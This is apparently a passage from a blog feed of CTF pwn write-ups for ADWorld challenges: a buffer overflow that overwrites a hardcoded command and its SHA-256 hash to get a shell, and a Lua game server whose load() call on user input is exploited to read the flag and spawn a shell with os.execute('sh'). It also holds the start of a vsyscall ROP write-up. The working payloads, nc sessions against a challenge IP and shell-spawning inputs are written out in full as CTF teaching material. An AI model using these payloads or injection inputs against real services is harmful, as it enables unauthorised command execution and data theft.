<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">sub_DD0</span><span class="params">(__int64 a1, _QWORD *a2, <span class="keyword">unsigned</span> <span class="keyword">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// er12</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+0h] [rbp-A8h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+78h] [rbp-30h]</span></span><br><span class="line"></span><br><span class="line">  v3 = a3;</span><br><span class="line">  *a2 = <span class="number">0LL</span>;</span><br><span class="line">  a2[<span class="number">1</span>] = <span class="number">0LL</span>;</span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  a2[<span class="number">2</span>] = <span class="number">0LL</span>;</span><br><span class="line">  a2[<span class="number">3</span>] = <span class="number">0LL</span>;</span><br><span class="line">  <span class="built_in">SHA256_Init</span>(&amp;v5);</span><br><span class="line">  <span class="built_in">SHA256_Update</span>((__int64)&amp;v5, a1, v3);</span><br><span class="line">  <span class="built_in">SHA256_Final</span>((__int64)a2, (__int64)&amp;v5);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>I edited some functions’ name and even changed some variables’ declaration in IDA to simplify the main logic.</p>
<h3 id="Analysis-2"><a href="#Analysis-2" class="headerlink" title="Analysis"></a>Analysis</h3><p>The program reads input and do <code>sha256</code> hash, then compare it with stored hash. If they are equal, a command will be executed.</p>
<p>The stored hash (<code>9387a00e31e413c55af9c08c69cd119ab4685ef3bc8bcbe1cf82161119457127</code>) and command (<code>/bin/cat ./secret_data.asc</code>) are both hardcoded, however it is not easy to unhash it, so we can overflow them as controlled content (sadly, cannot control program flow).</p>
<p>In <code>main()</code> we input to <code>dest</code>, program calculates the <code>sha256</code> result as <code>v17</code> and compare it with <code>v15</code> (stored hash). Command is in <code>v14</code> and will be 1st parameter of <code>popen</code>. Imitating <code>PREPARE()</code> we write our payload:<br>payload &#x3D; padding (<code>0x100</code>) + command (<code>0x1b</code>) + sha256(padding) (<code>0x40</code>)  </p>
<p>Note: because it uses <code>popen</code> which essentially fork a process to execute, if we set command as <code>/bin/sh</code> we can’t receive interaction directly. But if we <code>exit</code> the <code>sh</code> we can get all output. </p>
<h3 id="Exploit-2"><a href="#Exploit-2" class="headerlink" title="Exploit"></a>Exploit</h3><p>Produce payload:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">$ ipython</span><br><span class="line">...</span><br><span class="line">In [<span class="number">1</span>]: <span class="keyword">import</span> hashlib</span><br><span class="line">In [<span class="number">2</span>]: padding = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x100</span></span><br><span class="line">In [<span class="number">3</span>]: payload = padding + <span class="string">&#x27;sh;&#x27;</span>.ljust(<span class="number">0x1B</span>,<span class="string">&#x27;b&#x27;</span>) + hashlib.sha256(padding).hexdigest()</span><br><span class="line">In [<span class="number">4</span>]: <span class="built_in">print</span> payload</span><br><span class="line">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaash;bbbbbbbbbbbbbbbbbbbbbbbb02d7160d77e18c6447be80c2e355c7ed4388545271702c50253b0914c65ce5fe</span><br></pre></td></tr></table></figure>
<p>And send payload:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ nc 220.249.52.133 41676</span><br><span class="line">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaash;bbbbbbbbbbbbbbbbbbbbbbbb02d7160d77e18c6447be80c2e355c7ed4388545271702c50253b0914c65ce5fe</span><br><span class="line">ls</span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line">sh: 1: bbbbbbbbbbbbbbbbbbbbbbbb02d7160d77e18c6447be80c2e355c7ed4388545271702c50253b0914c65ce5fe: not found</span><br><span class="line">bin</span><br><span class="line">dev</span><br><span class="line">flag.txt</span><br><span class="line">lib</span><br><span class="line">lib32</span><br><span class="line">lib64</span><br><span class="line">secret_file</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Ncat: Broken pipe.</span><br><span class="line">$ nc 220.249.52.133 41676</span><br><span class="line">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaash;bbbbbbbbbbbbbbbbbbbbbbbb02d7160d77e18c6447be80c2e355c7ed4388545271702c50253b0914c65ce5fe</span><br><span class="line">cat flag.txt</span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line">sh: 1: bbbbbbbbbbbbbbbbbbbbbbbb02d7160d77e18c6447be80c2e355c7ed4388545271702c50253b0914c65ce5fe: not found</span><br><span class="line">cyberpeace&#123;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Aul"><a href="#Aul" class="headerlink" title="Aul"></a>Aul</h2><p>Attachment: None.<br>Description: None.</p>
<p>It is a <code>Lua</code> shell.</p>
<h3 id="Information-3"><a href="#Information-3" class="headerlink" title="Information"></a>Information</h3><p>As it gives no binary, I can only know the program by interaction:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ nc 220.249.52.133 51731</span><br><span class="line"><span class="built_in">let</span><span class="string">&#x27;s play a game</span></span><br><span class="line"><span class="string">| 0 0 0 0 0 0 0 0 |</span></span><br><span class="line"><span class="string">| 0 1 0 0 0 0 4 0 |</span></span><br><span class="line"><span class="string">| 0 3 2 2 4 1 4 4 |</span></span><br><span class="line"><span class="string">| 0 3 2 3 2 3 4 3 |</span></span><br><span class="line"><span class="string">| 4 b 2 2 4 4 3 4 |</span></span><br><span class="line"><span class="string">| 3 2 4 4 1 1 2 2 |</span></span><br><span class="line"><span class="string">| 3 3 c d 3 3 2 3 |</span></span><br><span class="line"><span class="string">| 3 2 1 4 4 a 2 4 |</span></span><br><span class="line"><span class="string">qwer</span></span><br><span class="line"><span class="string">Didn&#x27;</span>t understand. Type <span class="string">&#x27;rotate&#x27;</span>, <span class="string">&#x27;rotate_left&#x27;</span>, <span class="string">&#x27;exit&#x27;</span>, or <span class="string">&#x27;help&#x27;</span>.</span><br></pre></td></tr></table></figure>
<p>Use <code>rotate</code> and <code>rotate_left</code> to rotate the matrix in two directions, and use <code>help</code> we get:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">LuaS�</span><br><span class="line"></span><br><span class="line">xV(w@�,��,�,��,�,@��,��,���,�,@��,��,����CA�$@@C$@�&amp;�</span><br><span class="line">                                                                make_boardpopulate_boardboard_tostringfallrotatecrush</span><br><span class="line">                                            rotate_leftreadAllhelpquitexit       run_stepgame</span><br><span class="line">writelinelet&#x27;s play a game</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">   K@J��@@��</span><br><span class="line">               AF�@</span><br><span class="line">setmetatableA��J��@�f&amp;�size</span><br><span class="line">             __tostringboard_tostring&quot;</span><br><span class="line">                                            .�@���A@�@@$Ab@�����@RA, @��@�F�A���AB���Ad������</span><br><span class="line">@i���A�����h��@d���C�BC���</span><br><span class="line">��g��F�C�ef&amp;�sizemath</span><br><span class="line">                               randomseedipairsabcdmathrandomF@G@�������d���F��@�&amp;&amp;�mathrandom$/!K�@�@�@A�����BN�@��(B��A�������݁&#x27;�BA�A@�������$B�����@A���AA���&amp;�</span><br><span class="line">size| tableinsert |concat</span><br><span class="line">1D</span><br><span class="line">G@�@@��������N��(���@�$B&#x27;���&amp;�size</span><br><span class="line">                                                   make_board5=EN���@�@������������_@@�����������������N����&amp;���������FSG@��OCMÂGC�@&#x27;��@��&amp;�size�C�</span><br><span class="line">                                  make_boardUg</span><br><span class="line">$G@�@@��������A�A���@�N����(A����&#x27;��OA�N����(A�B�G�GB�@@����@����&#x27;��&amp;size</span><br><span class="line">                            make_boardabcdik      F@�@�@��ef&amp;�rotatemr</span><br><span class="line">          F@G@����d���������@��@�&amp;�ioopenrbread*allclosetx@@@F�@��d��$��F@A��@ǀ��d@&amp;�stringsubreadAll</span><br><span class="line">                                                     server.luac     writerawlen&#123;&#125;@@�&amp;�quit�-F@d���@@��@�����@���A�@����@@�@A�������@����@@�@A�������@����B�@���������B@������&amp;�</span><br><span class="line">                                                               readlinestringlenexitfind       functionprintloadreturn ��%@F@@��d$�F�@�A����@��d@F�A�d���A�@@�_�@���@BƀBAB@$�������@���@���&amp;�</span><br><span class="line">                                                               populate_board</span><br><span class="line">                                                                               make_board</span><br><span class="line">writelineboard_tostring</span><br><span class="line">       run_stepquitfallcrushEDidn&#x27;t understand. Type &#x27;rotate&#x27;, &#x27;rotate_left&#x27;, &#x27;exit&#x27;, or &#x27;help&#x27;.</span><br><span class="line">Didn&#x27;t understand. Type &#x27;rotate&#x27;, &#x27;rotate_left&#x27;, &#x27;exit&#x27;, or &#x27;help&#x27;.</span><br></pre></td></tr></table></figure>
<p>It looks like <code>luac</code> – the opcode&#x2F;bytecode of <code>Lua</code>. And if we enter number or something, we get:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ nc 220.249.52.133 51731</span><br><span class="line"><span class="built_in">let</span><span class="string">&#x27;s play a game</span></span><br><span class="line"><span class="string">| 0 0 0 0 0 0 0 0 |</span></span><br><span class="line"><span class="string">| 0 1 0 0 0 0 4 0 |</span></span><br><span class="line"><span class="string">| 0 3 2 2 4 1 4 4 |</span></span><br><span class="line"><span class="string">| 0 3 2 3 2 3 4 3 |</span></span><br><span class="line"><span class="string">| 4 b 2 2 4 4 3 4 |</span></span><br><span class="line"><span class="string">| 3 2 4 4 1 1 2 2 |</span></span><br><span class="line"><span class="string">| 3 3 c d 3 3 2 3 |</span></span><br><span class="line"><span class="string">| 3 2 1 4 4 a 2 4 |</span></span><br><span class="line"><span class="string">1</span></span><br><span class="line"><span class="string">lua Error: ?:-1: attempt to call a number value</span></span><br></pre></td></tr></table></figure>
<p>So it is definitely a <code>Lua</code> shell.</p>
<h3 id="Analysis-3"><a href="#Analysis-3" class="headerlink" title="Analysis"></a>Analysis</h3><p>Questioner wants us to decompile <code>luac</code> file, but the result of <code>help</code> gives us a broken one, with its header lack of 1 byte. </p>
<p>The head of <code>luac</code> file should be <code>1b 4c 75 61</code>, so we have to fix it and use <code>unluac</code> or <code>luadec</code> to decompile it. The result of it should be like:</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- http://www.playwithlua.com/?p=28</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">make_board</span><span class="params">(size)</span></span></span><br><span class="line">   <span class="keyword">local</span> board = &#123; size = size &#125;</span><br><span class="line">   <span class="built_in">setmetatable</span>(board, &#123; <span class="built_in">__tostring</span> = board_tostring &#125;)</span><br><span class="line"></span><br><span class="line">   <span class="keyword">for</span> n = <span class="number">0</span>, size * size - <span class="number">1</span> <span class="keyword">do</span></span><br><span class="line">      board[n] = <span class="number">0</span></span><br><span class="line">   <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> board</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">populate_board</span><span class="params">(board, filled, seed)</span></span></span><br><span class="line">   <span class="keyword">local</span> size = board.size</span><br><span class="line">   <span class="keyword">if</span> seed <span class="keyword">then</span> <span class="built_in">math</span>.<span class="built_in">randomseed</span>(seed) <span class="keyword">end</span></span><br><span class="line">   filled = filled <span class="keyword">or</span> size * size * <span class="number">3</span> / <span class="number">4</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">local</span> <span class="function"><span class="keyword">function</span> <span class="title">rand</span><span class="params">()</span></span></span><br><span class="line">      <span class="keyword">local</span> c</span><br><span class="line">      <span class="keyword">repeat</span> c = <span class="built_in">math</span>.<span class="built_in">random</span>(size * size) - <span class="number">1</span> <span class="keyword">until</span> board[c] == <span class="number">0</span></span><br><span class="line">      <span class="keyword">return</span> c</span><br><span class="line">   <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> filled &gt; <span class="number">0</span> <span class="keyword">then</span></span><br><span class="line">      <span class="keyword">for</span> _,v <span class="keyword">in</span> <span class="built_in">ipairs</span>&#123;<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>&#125; <span class="keyword">do</span> board[rand()] = v <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">for</span> n = <span class="number">1</span>, filled<span class="number">-4</span> <span class="keyword">do</span></span><br><span class="line">         board[rand()] = <span class="built_in">math</span>.<span class="built_in">random</span>(<span class="number">4</span>)</span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> fall(board)</span><br><span class="line">   <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">board_tostring</span><span class="params">(board)</span></span></span><br><span class="line">   <span class="keyword">local</span> <span class="built_in">lines</span> = &#123;&#125;</span><br><span class="line">   <span class="keyword">local</span> size = board.size</span><br><span class="line">   <span class="keyword">for</span> y = <span class="number">0</span>, size - <span class="number">1</span> <span class="keyword">do</span></span><br><span class="line">      <span class="keyword">local</span> line = <span class="string">&quot;|&quot;</span></span><br><span class="line">      <span class="keyword">for</span> x = <span class="number">0</span>, size - <span class="number">1</span> <span class="keyword">do</span></span><br><span class="line">         line = line .. <span class="string">&quot; &quot;</span> .. board[x+y*size]</span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line">      <span class="built_in">table</span>.<span class="built_in">insert</span>(<span class="built_in">lines</span>, line .. <span class="string">&quot; |&quot;</span>)</span><br><span class="line">   <span class="keyword">end</span></span><br><span class="line">   <span class="keyword">return</span> <span class="built_in">table</span>.<span class="built_in">concat</span>(<span class="built_in">lines</span>,<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fall</span><span class="params">(board)</span></span></span><br><span class="line">   <span class="keyword">local</span> size = board.size</span><br><span class="line">   <span class="keyword">local</span> new_board = make_board(size, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">   <span class="keyword">local</span> <span class="function"><span class="keyword">function</span> <span class="title">fall_column</span><span class="params">(col)</span></span></span><br><span class="line">      <span class="keyword">local</span> dest = size - <span class="number">1</span></span><br><span class="line">      <span class="keyword">for</span> y = size<span class="number">-1</span>, <span class="number">0</span>, <span class="number">-1</span> <span class="keyword">do</span></span><br><span class="line">         <span class="keyword">if</span> board[y*size + col] ~= <span class="number">0</span> <span class="keyword">then</span></span><br><span class="line">            new_board[dest*size + col] = board[y*size + col]</span><br><span class="line">            dest = dest - <span class="number">1</span></span><br><span class="line">         <span class="keyword">end</span></span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line">   <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">for</span> x=<span class="number">0</span>, size<span class="number">-1</span> <span class="keyword">do</span></span><br><span class="line">      fall_column(x)</span><br><span class="line">   <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> new_board</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">rotate</span><span class="params">(board)</span></span></span><br><span class="line">   <span class="keyword">local</span> size = board.size</span><br><span class="line">   <span class="keyword">local</span> new_board = make_board(size, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">   <span class="keyword">for</span> y = <span class="number">0</span>, size<span class="number">-1</span> <span class="keyword">do</span></span><br><span class="line">      <span class="keyword">local</span> dest_col = size - <span class="number">1</span> - y</span><br><span class="line"></span><br><span class="line">      <span class="keyword">for</span> n = <span class="number">0</span>, size<span class="number">-1</span> <span class="keyword">do</span></span><br><span class="line">         new_board[n*size + dest_col] = board[y*size + n]</span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line">   <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> new_board</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">crush</span><span class="params">(board)</span></span></span><br><span class="line">   <span class="keyword">local</span> size = board.size</span><br><span class="line">   <span class="keyword">local</span> new_board = make_board(size, <span class="number">0</span>)</span><br><span class="line">   <span class="keyword">local</span> crushers = &#123;<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">for</span> n=<span class="number">0</span>, size<span class="number">-1</span> <span class="keyword">do</span></span><br><span class="line">      new_board[n] = board[n]</span><br><span class="line">   <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">for</span> n = size, size*size - <span class="number">1</span> <span class="keyword">do</span></span><br><span class="line">      <span class="keyword">if</span> board[n-size] == crushers[board[n]] <span class="keyword">then</span></span><br><span class="line">         new_board[n] = <span class="number">0</span></span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">         new_board[n] = board[n]</span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line">   <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> new_board</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">rotate_left</span><span class="params">(board)</span></span></span><br><span class="line">   <span class="keyword">return</span> rotate(rotate(rotate(board)))</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">readAll</span><span class="params">(file)</span></span></span><br><span class="line">    <span class="keyword">local</span> f = <span class="built_in">io</span>.<span class="built_in">open</span>(file, <span class="string">&quot;rb&quot;</span>)</span><br><span class="line">    <span class="keyword">local</span> content = f:<span class="built_in">read</span>(<span class="string">&quot;*all&quot;</span>)</span><br><span class="line">    f:<span class="built_in">close</span>()</span><br><span class="line">    <span class="keyword">return</span> content</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">help</span><span class="params">()</span></span></span><br><span class="line">        <span class="keyword">local</span> l = <span class="built_in">string</span>.<span class="built_in">sub</span>(readAll(<span class="string">&quot;server.luac&quot;</span>), <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">        writeraw(l, <span class="built_in">string</span>.<span class="built_in">len</span>(l))</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">quit = <span class="literal">false</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">exit</span><span class="params">()</span></span></span><br><span class="line">        quit = <span class="literal">true</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">run_step</span><span class="params">(board)</span></span></span><br><span class="line">   <span class="keyword">local</span> cmd = readline()</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span>(<span class="built_in">string</span>.<span class="built_in">len</span>(cmd) == <span class="number">0</span>) <span class="keyword">then</span></span><br><span class="line">         <span class="built_in">exit</span>()</span><br><span class="line">         <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">   <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">-- prevent injection attacks</span></span><br><span class="line">   <span class="keyword">if</span>(<span class="built_in">string</span>.<span class="built_in">find</span>(cmd, <span class="string">&quot;function&quot;</span>)) <span class="keyword">then</span></span><br><span class="line">         <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">   <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span>(<span class="built_in">string</span>.<span class="built_in">find</span>(cmd, <span class="string">&quot;print&quot;</span>)) <span class="keyword">then</span></span><br><span class="line">         <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">   <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">local</span> f = <span class="built_in">load</span>(<span class="string">&quot;return &quot;</span> .. cmd)()</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> f == <span class="literal">nil</span> <span class="keyword">then</span></span><br><span class="line">         <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">   <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> f(board)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">game</span><span class="params">()</span></span></span><br><span class="line">   <span class="keyword">local</span> board = populate_board(make_board(<span class="number">8</span>))</span><br><span class="line"></span><br><span class="line">   <span class="keyword">repeat</span></span><br><span class="line"></span><br><span class="line">      writeline(board_tostring(board) .. <span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">      <span class="keyword">local</span> b = run_step(board)</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> quit <span class="keyword">then</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> b ~= <span class="literal">nil</span> <span class="keyword">then</span></span><br><span class="line">         board = b</span><br><span class="line">         board = fall(crush(fall(board)))</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">         writeline(<span class="string">&quot;Didn&#x27;t understand. Type &#x27;rotate&#x27;, &#x27;rotate_left&#x27;, &#x27;exit&#x27;, or &#x27;help&#x27;.\n&quot;</span>)</span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">until</span> <span class="literal">false</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">writeline(<span class="string">&quot;let&#x27;s play a game\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">game()</span><br></pre></td></tr></table></figure>
<p>So <code>local f = load(&quot;return &quot; .. cmd)()</code> might be the key part, because we can do code execution here.</p>
<p>It still has an unexpected solution. Like what we did in <a href="#monkey">monkey</a>, we can also obtain <code>Lua</code> shell directly by <code>os.execute(&#39;/bin/sh&#39;)</code> </p>
<h3 id="Exploit-3"><a href="#Exploit-3" class="headerlink" title="Exploit"></a>Exploit</h3><p>Expected solution on adworld wp:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ nc 220.249.52.133 51731</span><br><span class="line"><span class="built_in">let</span><span class="string">&#x27;s play a game</span></span><br><span class="line"><span class="string">| 0 0 0 0 0 0 0 0 |</span></span><br><span class="line"><span class="string">| 0 1 0 0 0 0 4 0 |</span></span><br><span class="line"><span class="string">| 0 3 2 2 4 1 4 4 |</span></span><br><span class="line"><span class="string">| 0 3 2 3 2 3 4 3 |</span></span><br><span class="line"><span class="string">| 4 b 2 2 4 4 3 4 |</span></span><br><span class="line"><span class="string">| 3 2 4 4 1 1 2 2 |</span></span><br><span class="line"><span class="string">| 3 3 c d 3 3 2 3 |</span></span><br><span class="line"><span class="string">| 3 2 1 4 4 a 2 4 |</span></span><br><span class="line"><span class="string">load(&#x27;</span>lines = io.lines(<span class="string">&quot;flag&quot;</span>)\n <span class="keyword">for</span> l <span class="keyword">in</span> lines <span class="keyword">do</span> writeline(l) end<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">cyberpeace&#123;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&#125;Didn&#x27;</span>t understand. Type <span class="string">&#x27;rotate&#x27;</span>, <span class="string">&#x27;rotate_left&#x27;</span>, <span class="string">&#x27;exit&#x27;</span>, or <span class="string">&#x27;help&#x27;</span>.</span><br></pre></td></tr></table></figure>
<p>Unexpected solution:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ nc 220.249.52.133 51731</span><br><span class="line"><span class="built_in">let</span><span class="string">&#x27;s play a game</span></span><br><span class="line"><span class="string">| 0 0 0 0 0 0 0 0 |</span></span><br><span class="line"><span class="string">| 0 1 0 0 0 0 4 0 |</span></span><br><span class="line"><span class="string">| 0 3 2 2 4 1 4 4 |</span></span><br><span class="line"><span class="string">| 0 3 2 3 2 3 4 3 |</span></span><br><span class="line"><span class="string">| 4 b 2 2 4 4 3 4 |</span></span><br><span class="line"><span class="string">| 3 2 4 4 1 1 2 2 |</span></span><br><span class="line"><span class="string">| 3 3 c d 3 3 2 3 |</span></span><br><span class="line"><span class="string">| 3 2 1 4 4 a 2 4 |</span></span><br><span class="line"><span class="string">os.execute(&#x27;</span>sh<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">ls</span></span><br><span class="line"><span class="string">bin</span></span><br><span class="line"><span class="string">dev</span></span><br><span class="line"><span class="string">flag</span></span><br><span class="line"><span class="string">lib</span></span><br><span class="line"><span class="string">lib64</span></span><br><span class="line"><span class="string">run.sh</span></span><br><span class="line"><span class="string">scripty</span></span><br><span class="line"><span class="string">server.lua</span></span><br><span class="line"><span class="string">server.luac</span></span><br><span class="line"><span class="string">cat flag</span></span><br><span class="line"><span class="string">cyberpeace&#123;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>linux</tag>
        <tag>ctf</tag>
        <tag>rand</tag>
        <tag>js</tag>
      </tags>
  </entry>
  <entry>
    <title>ADWorld PWN Challenge Area Write-ups (Advanced ROP)</title>
    <url>/2020/10/09/2020-10-09-ADWorld-PWN-Challenge-Area-Write-ups-Advanced-ROP/</url>
    <content><![CDATA[<p>This part is for special <code>ROP</code> tasks.</p>
<h2 id="1000levels"><a href="#1000levels" class="headerlink" title="1000levels"></a>1000levels</h2><p>Attachment: <a href="/filehost/apcaw/1000levevls.gz">1000levevls.gz</a><br>Description: None</p>
<p>It is related to <code>vsyscall</code> which exists in some old version <code>glibc</code>.</p>
<h3 id="Information"><a href="#Information" class="headerlink" title="Information"></a>Information</h3><p>Unzip:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ tar xvf 1000levevls.gz</span><br><span class="line">100levels</span><br><span class="line">libc.so</span><br></pre></td></tr></table></figure>
<p>Check:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ file 100levels</span><br><span class="line">100levels: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=8293d0a04bff99850d490343e65e25d81b6b1966, stripped</span><br><span class="line">$ checksec 100levels</span><br><span class="line">[*] &#x27;/root/100levels&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">$ ./libc.so</span><br><span class="line">GNU C Library (Ubuntu GLIBC 2.23-0ubuntu7) stable release version 2.23, by Roland McGrath et al.</span><br><span class="line">Copyright (C) 2016 Free Software Foundation, Inc.</span><br><span class="line">This is free software; see the source for copying conditions.</span><br><span class="line">There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A</span><br><span class="line">PARTICULAR PURPOSE.</span><br><span class="line">Compiled by GNU CC version 5.4.0 20160609.</span><br><span class="line">Available extensions:</span><br><span class="line">        crypt add-on version 2.1 by Michael Glad and others</span><br><span class="line">        GNU Libidn by Simon Josefsson</span><br><span class="line">        Native POSIX Threads Library by Ulrich Drepper et al</span><br><span class="line">        BIND-8.2.3-T5B</span><br><span class="line">libc ABIs: UNIQUE IFUNC</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs&gt;.</span><br></pre></td></tr></table></figure>
<p>Pseudocode:<br><code>main</code>:</p>
